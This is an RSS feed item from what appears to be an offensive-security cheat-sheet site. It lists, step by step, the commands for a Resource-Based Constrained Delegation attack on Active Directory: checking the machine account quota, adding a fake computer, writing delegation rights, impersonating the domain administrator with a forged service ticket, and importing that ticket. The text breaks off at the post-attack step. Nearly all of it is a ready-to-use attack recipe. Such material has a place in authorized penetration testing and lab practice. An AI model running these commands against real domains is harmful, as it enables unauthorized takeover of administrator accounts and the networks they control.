channel.title: Resource-Based Constrained Delegation on TLDRBins
channel.description: Recent content in Resource-Based Constrained Delegation on TLDRBins

item.title: RBCD Attack
item.description: RBCD Attack (From Linux) 0. Check machine account quota nxc ldap 10.10.11.10 -u <USERNAME> -p <PASSWORD> -M MAQ 1. Add a fake computer impacket-addcomputer -computer-name 'EvilComputer' -computer-pass 'password' -dc-ip 10.10.11.10 example.com/username:password 2. Rbcd attack impacket-rbcd -delegate-to TARGET_COMPUTER$ -delegate-from EvilComputer$ -dc-ip dc.example.com -action 'write' example.com/username:password 3. Impersonate sudo ntpdate -s dc.example.com && impacket-getST -spn cifs/dc.example.com -impersonate administrator -dc-ip dc.example.com 'example.com/EvilComputer:password' 4. Import ticket export KRB5CCNAME=administrator@cifs_dc.example.com@example.com.ccache 5. Post-Attack # Remote sudo ntpdate -s dc.
